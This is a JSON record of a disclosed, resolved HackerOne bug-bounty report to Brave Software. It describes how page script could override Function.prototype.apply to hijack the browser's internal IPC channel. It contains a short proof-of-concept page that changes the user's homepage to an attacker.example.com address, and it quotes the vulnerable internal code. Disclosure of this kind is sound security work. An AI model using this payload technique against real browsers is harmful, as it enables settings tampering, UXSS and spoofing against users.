{
  "id": 188086,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xODgwODY=",
  "url": "https://hackerone.com/reports/188086",
  "title": "Sending arbitrary IPC messages via overriding Function.prototype.apply",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "critical",
  "readable_substate": "Resolved",
  "created_at": "2016-12-03T21:36:17.831Z",
  "submitted_at": "2016-12-03T21:36:17.831Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "masatokinugawa",
    "url": "/masatokinugawa",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/002/268/8726487298cd9ad456637d3e948587d1365d869a_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 15688,
    "url": "https://hackerone.com/brave",
    "handle": "brave",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/015/688/2aad5641af643ee4f4402896e4747293f6e9c5ca_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/015/688/2aad5641af643ee4f4402896e4747293f6e9c5ca_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Brave Software",
      "twitter_handle": "brave",
      "website": "https://brave.com",
      "about": ""
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2018-09-18T18:15:50.065Z",
  "bug_reporter_agreed_on_going_public_at": "2018-08-18T08:43:12.519Z",
  "team_member_agreed_on_going_public_at": "2018-09-18T18:15:49.599Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "## Summary:\nBrave Browser allows to overwrite the internal js code from the user js code.\nUsing this behavior, an attacker can send arbitrary IPC messages and do UXSS, address bar spoofing, changing browser settings and so on. This bug is similar to #187542.\n\n## Tested on: \nBrave\t0.12.11\n\n## Steps To Reproduce:\n1. Go to this page: https://vulnerabledoma.in/brave/settings_change2.html \n```\n<script>\nFunction.prototype.apply=function(ipc){\n    ipc.send(\"dispatch-action\",'{\"actionType\":\"app-change-setting\",\"key\":\"general.homepage\",\"value\":\"http://attacker.example.com/\"}');\n}\n</script>\n<div style=\"visibility:hidden\">\n<embed src=\".swf\"></embed>\n</div>\n```\n\n2. See `about:preferences`. You can confirm that your home page is changed to `http://attacker.example.com/`.\n\nAlso an attacker can do UXSS and address bar spoofing using this bug. Please see #187542's PoC .\n\n#Technical Details\n\nThis `apply` in the `ipc_utils.js` is overwritten: \n```\n  ipcRenderer.emit = function () {\n    arguments[1].sender = ipcRenderer\n    return EventEmitter.prototype.emit.apply(ipcRenderer, arguments)\n  }\n  atom.v8.setHiddenValue('ipc', ipcRenderer)\n}\n```\nAnd the 1st arguments leaks IPC method.\n\nCould you confirm this bug?\nThanks!",
  "bounty_amount": "5300.0",
  "formatted_bounty": "$5,300",
  "weakness": {
    "id": 58,
    "name": "Command Injection - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 52,
  "voters": [
    "irvinlim",
    "0xcaptainfreak",
    "mr_me",
    "foobar7",
    "inhibitor181",
    "kapytein",
    "muon4",
    "sameerphad72",
    "mattaustin",
    "teknogeek",
    "and 42 more..."
  ],
  "severity": {
    "rating": "critical",
    "author_type": "User"
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
